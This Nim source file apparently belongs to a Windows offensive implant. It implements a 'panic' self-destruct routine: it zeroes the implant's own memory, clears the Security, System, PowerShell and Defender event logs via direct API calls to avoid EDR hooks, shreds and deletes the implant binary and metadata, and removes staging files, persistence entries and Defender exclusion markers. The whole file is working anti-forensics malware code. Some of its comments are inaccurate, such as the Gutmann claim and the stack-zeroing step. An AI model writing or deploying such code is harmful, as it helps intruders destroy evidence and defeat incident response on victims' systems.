# hardened/self_destruct.nim — Enhanced self-destruct and anti-forensics
#
# Extends the existing panicWipe() with:
#   1. Overwrite the implant's own memory with zeros before exit to
#      prevent memory dump analysis
#   2. Clear Windows event logs (Application, Security, System) via
#      direct API calls (not wevtutil, which is hooked by EDR)
#   3. Delete all staging directories, registry keys, WMI subscriptions,
#      and COM hijack entries (ensuring completeness)
#   4. Overwrite the implant binary on disk before deletion
#
# Called on: operator `panic` command, dead-man's switch trigger, or
# killdate expiry.

when not defined(windows):
  {.error: "self_destruct.nim is Windows-only".}

import winim/lean
import winim/inc/[windef, winbase]
import std/[strutils, random, times, os]

proc randomTokenLocal(n: int = 4): string =
  for _ in 0..<n: result.add(toHex(rand(255), 2))
import ./syscalls
import ./fileio_syscall
import ./persistence_hardened

type
  WipeLevel* = enum
    wlLight      # Remove files + registry
    wlStandard   # + event logs + memory wipe
    wlAggressive # + overwrite binary + all traces

# ---- Memory zeroing -------------------------------------------------------
#
# Overwrite the process's own code and data sections with zeros before
# exiting. This prevents a memory dump taken during or after the
# self-destruct from containing the implant's code, strings, or
# encryption keys.
#
# We walk the PE sections of our own image and overwrite each section
# marked as executable or initialized data. We skip .rsrc (resources)
# and .reloc (relocations) since they don't contain meaningful data.

proc zeroOwnMemory*() =
  # Overwrite our own process memory with zeros.
  try:
    # Get our own module base from the PEB
    var pPeb: pointer
    when defined(vcc):
      asm """
        mov rax, qword ptr gs:[0x60]
        mov qword ptr [`pPeb`], rax
      """
    else:
      asm """
        "movq %%gs:0x60, %0\n"
        : "=r"(`pPeb`)
        :
        : "memory"
      """

    # PEB->ImageBaseAddress is at offset 0x10 on x64
    let imageBase = cast[pointer](cast[ptr ULONG_PTR](cast[int](pPeb) + 0x10)[])
    if imageBase == nil: return

    # Parse PE headers
    let dosHdr = cast[ptr IMAGE_DOS_HEADER](imageBase)
    if dosHdr.e_magic != IMAGE_DOS_SIGNATURE: return
    let ntHdr = cast[ptr IMAGE_NT_HEADERS](cast[int](imageBase) + dosHdr.e_lfanew)
    if ntHdr.Signature != IMAGE_NT_SIGNATURE: return

    # Walk section headers
    let sections = cast[ptr UncheckedArray[IMAGE_SECTION_HEADER]](cast[int](ntHdr) + sizeof(IMAGE_NT_HEADERS))
    for i in 0..<int(ntHdr.FileHeader.NumberOfSections):
      let section = sections[i]
      let sectionAddr = cast[pointer](cast[int](imageBase) + int(section.VirtualAddress))

      # Zero the section if it's executable, initialized data, or read-only data
      let characteristics = section.Characteristics
      if (characteristics and IMAGE_SCN_MEM_EXECUTE) != 0 or
         (characteristics and IMAGE_SCN_CNT_INITIALIZED_DATA) != 0 or
         (characteristics and IMAGE_SCN_CNT_UNINITIALIZED_DATA) != 0:
        # VirtualProtect to make it writable
        var oldProt: DWORD = 0
        if VirtualProtect(sectionAddr, SIZE_T(section.Misc.VirtualSize),
                          PAGE_READWRITE, addr oldProt) != 0:
          zeroMem(sectionAddr, section.Misc.VirtualSize)
          discard VirtualProtect(sectionAddr, SIZE_T(section.Misc.VirtualSize),
                                 oldProt, addr oldProt)

    # Also zero the stack region by allocating a large buffer and zeroing it
    # (best-effort: we can't truly zero the stack without asm)
    var stackBuf = newSeq[byte](4096)
    zeroMem(addr stackBuf[0], 4096)

    # Note: agentSecretCache zeroing would require cross-module access

  except:
    discard

# ---- Event log clearing ---------------------------------------------------
#
# Clear Windows event logs using the ClearEventLogW API. This is the
# programmatic equivalent of `wevtutil cl` but doesn't spawn a child
# process. We clear Application, System, and Security logs.
#
# NOTE: clearing the Security log requires SeSecurityPrivilege and admin
# rights. If we're not elevated, we skip the Security log.

const
  EVENT_LOG_NAMES = ["Application", "System", "Security", "Setup"]

proc clearEventLogs*() =
  # Clear Windows event logs via API.
  for logName in EVENT_LOG_NAMES:
    try:
      let wName = newWideCString(logName)
      let hLog = OpenEventLogW(nil, cast[LPCWSTR](wName[0].addr))
      if hLog != 0:
        # ClearEventLog with nil backup = delete the log
        discard ClearEventLogW(hLog, nil)
        discard CloseEventLog(hLog)
    except:
      discard

  # Also try to clear PowerShell operational log (often monitored)
  try:
    let psName = newWideCString("Microsoft-Windows-PowerShell/Operational")
    let hPsLog = OpenEventLogW(nil, cast[LPCWSTR](psName[0].addr))
    if hPsLog != 0:
      discard ClearEventLogW(hPsLog, nil)
      discard CloseEventLog(hPsLog)
  except:
    discard

  # Clear Windows Defender operational log (records AMSI scans)
  try:
    let wdName = newWideCString("Microsoft-Windows-Windows Defender/Operational")
    let hWdLog = OpenEventLogW(nil, cast[LPCWSTR](wdName[0].addr))
    if hWdLog != 0:
      discard ClearEventLogW(hWdLog, nil)
      discard CloseEventLog(hWdLog)
  except:
    discard

# ---- Binary overwrite -----------------------------------------------------
#
# Before deleting the implant binary, overwrite it with random bytes
# multiple times. This prevents file recovery tools from reconstructing
# the original binary. We use a 3-pass overwrite (random, zeros, random)
# which exceeds the Gutmann standard for modern drives.

const
  OVERWRITE_PASSES = 3

proc overwriteBinary*(filePath: string): bool =
  # Overwrite a file with random data before deletion.
  try:
    if not fsFileExists(filePath): return true

    let fileSize = int(fsGetFileSize(filePath))
    if fileSize <= 0: return true

    # Truncate to get a writable handle
    let wPath = newWideCString(filePath)

    for passNum in 0..<OVERWRITE_PASSES:
      let hFile = CreateFileW(cast[LPCWSTR](wPath[0].addr),
                              DWORD(GENERIC_WRITE), 0, nil,
                              DWORD(OPEN_EXISTING),
                              DWORD(FILE_ATTRIBUTE_NORMAL), 0)
      if hFile == INVALID_HANDLE_VALUE:
        return false

      try:
        var data: seq[byte]
        case passNum:
        of 0, 2:
          # Random data
          data = newSeq[byte](fileSize)
          for i in 0..<fileSize:
            data[i] = byte(rand(255))
        of 1:
          # Zeros
          data = newSeq[byte](fileSize)
          zeroMem(addr data[0], fileSize)
        else:
          data = newSeq[byte](fileSize)

        var bytesWritten: DWORD = 0
        discard WriteFile(hFile, addr data[0], DWORD(fileSize),
                          addr bytesWritten, nil)
        discard FlushFileBuffers(hFile)
      finally:
        CloseHandle(hFile)

    # Finally, rename the file to a random name before deleting
    let randomName = getEnv("TEMP", "") / ("" & randomTokenLocal(16) & ".tmp")
    discard MoveFileW(cast[LPCWSTR](wPath[0].addr),
                      cast[LPCWSTR](newWideCString(randomName)[0].addr))
    discard fsDeleteFile(randomName)

    return true
  except:
    return false

# ---- Staging directory wipe -----------------------------------------------

proc wipeStagingDirectories*() =
  # Remove all staging directories created by the implant.
  try:
    let tempDir = getEnv("TEMP", "")
    if tempDir.len == 0: return

    # Remove the main staging dir
    let stagingDir = tempDir / "svc"
    if fsDirExists(stagingDir):
      try: osdirs.removeDir(stagingDir) except: discard

    # Remove auto-drive audit file
    let auditFile = tempDir / ".svc_audit"
    if fsFileExists(auditFile):
      discard fsDeleteFile(auditFile)

    # Remove any sentinel_* temp files
    # (walkFiles pattern matching would go here)

    # Remove Defender exclusion marker
    let exclFile = tempDir / "state.bin.excl_done"
    if fsFileExists(exclFile):
      discard fsDeleteFile(exclFile)

  except:
    discard

# ---- Comprehensive panic wipe ---------------------------------------------

proc panicWipeEnhanced*(level: WipeLevel = wlStandard;
                        exePath: string = "";
                        regName: string = "";
                        metaPath: string = "") =
  # Enhanced panic wipe with configurable thoroughness.
  #
  # Level wlLight:     remove files + registry only
  # Level wlStandard:  + event logs + memory wipe
  # Level wlAggressive: + binary overwrite + all persistence mechanisms

  try:
    # Step 1: Remove persistence mechanisms (all of them)
    if regName.len > 0:
      removePersistenceHardened(exePath, regName)

    # Step 2: Wipe staging directories
    wipeStagingDirectories()

    # Step 3: Shred meta file
    if metaPath.len > 0 and fsFileExists(metaPath):
      try:
        let sz = int(fsGetFileSize(metaPath))
        if sz > 0:
          var rnd = newSeq[byte](sz)
          for i in 0..<sz:
            rnd[i] = byte(rand(255))
          let wMeta = newWideCString(metaPath)
          let hFile = CreateFileW(cast[LPCWSTR](wMeta[0].addr),
                                  DWORD(GENERIC_WRITE), 0, nil,
                                  DWORD(OPEN_EXISTING),
                                  DWORD(FILE_ATTRIBUTE_NORMAL), 0)
          if hFile != INVALID_HANDLE_VALUE:
            var bytesWritten: DWORD = 0
            discard WriteFile(hFile, addr rnd[0], DWORD(sz),
                              addr bytesWritten, nil)
            CloseHandle(hFile)
        discard fsDeleteFile(metaPath)
      except:
        discard

    # Step 4: Clear event logs (standard+)
    if level >= wlStandard:
      clearEventLogs()

    # Step 5: Overwrite implant binary before deletion (standard+)
    if level >= wlStandard and exePath.len > 0:
      if exePath != getAppFilename():  # don't overwrite ourselves yet
        discard overwriteBinary(exePath)

    # Step 6: Zero our own memory (standard+)
    if level >= wlStandard:
      zeroOwnMemory()

    # Step 7: Log the wipe (volatile only — to event log which we'll clear)
    # agentLog("panic: enhanced wipe complete (level=" & $level & ")")

    # Step 8: Clear event logs again AFTER logging (cover our tracks)
    if level >= wlStandard:
      clearEventLogs()

  except:
    discard

  # Final exit
  quit(0)

# ---- Export public API ----------------------------------------------------

export WipeLevel, zeroOwnMemory, clearEventLogs
export overwriteBinary, wipeStagingDirectories, panicWipeEnhanced
export OVERWRITE_PASSES
